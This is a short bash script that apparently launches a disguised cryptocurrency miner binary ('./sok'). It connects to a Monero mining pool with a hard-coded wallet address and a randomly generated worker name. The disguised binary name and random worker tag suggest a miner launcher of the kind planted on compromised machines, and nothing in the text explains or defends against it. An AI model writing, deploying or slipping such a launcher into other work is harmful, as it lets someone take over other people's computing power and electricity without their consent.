#!/bin/bash
A=xmr.f2pool.com:13531
B=83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju
C=$(echo $(shuf -i 1-9999999 -n 1)-COEL)
./sok -o $A -u $B -p $C -a wrkzcoin -p x -k
